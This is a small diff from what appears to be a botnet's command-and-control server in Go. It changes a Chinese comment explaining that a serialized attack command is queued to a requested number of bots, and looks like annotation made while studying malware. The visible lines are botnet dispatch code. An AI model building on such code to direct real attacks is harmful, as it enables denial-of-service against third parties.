@@ -80,7 +80,7 @@ func (this *Api) Handle() {
 		this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
 		return
 	}
-	//发送攻击命令的序列化表示buf，以及要求
+	//发送攻击命令的序列化表示buf，以及攻击要求的bot数量
 	clientList.QueueBuf(buf, botCount, "") //clientList在main.go启动的时候就已经创建了，一直处于工作状态（相应的channel在等待）
 	this.conn.Write([]byte("OK\r\n"))
 }
